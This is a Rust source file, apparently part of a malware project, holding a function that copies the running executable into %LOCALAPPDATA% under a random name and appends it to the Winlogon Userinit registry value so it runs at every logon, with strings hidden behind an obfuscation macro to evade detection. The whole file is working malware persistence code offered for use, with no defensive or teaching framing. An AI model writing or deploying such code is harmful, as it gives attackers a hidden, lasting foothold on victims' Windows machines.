use anyhow::{Result, bail, Context};
use winreg::RegKey;
use winapi::um::winreg::{HKEY_LOCAL_MACHINE};

use crate::modules::random::random_name;
use crate::obfuscate;

pub fn persist() -> Result<()> {
    
    let result: Result<()> = (|| {
        let current_exe = std::env::current_exe()?;
        let current_exe_str = current_exe.to_string_lossy();
        // copy the executable tom %LOCALAPPDATA%
        let user_profile = std::env::var(&obfuscate!("LOCALAPPDATA"))?;
        let new_path = format!("{}\\{}.exe", user_profile, random_name());
        
        std::fs::copy(&current_exe, &new_path)?;        
        
        let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
        let path = obfuscate!(r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon");
        
        let (key, _disp) = hklm
            .create_subkey(path)
            .context(obfuscate!("Failed to create/open Winlogon registry key"))?;

        let userinit: String = obfuscate!("C:\\Windows\\system32\\userinit.exe");

        // Append to Userinit if not present
        if !userinit.contains(&new_path) {
            let new_userinit = format!("{},{}", userinit, new_path);
            key.set_value(&obfuscate!("Userinit"), &new_userinit)
                .context(obfuscate!("Failed to set Userinit registry value"))?;
        }
        
        Ok(())
    })();
    
    match result {
        Ok(_) => return Ok(()),
        Err(e) => bail!(e),
    }
    
    Ok(())
}

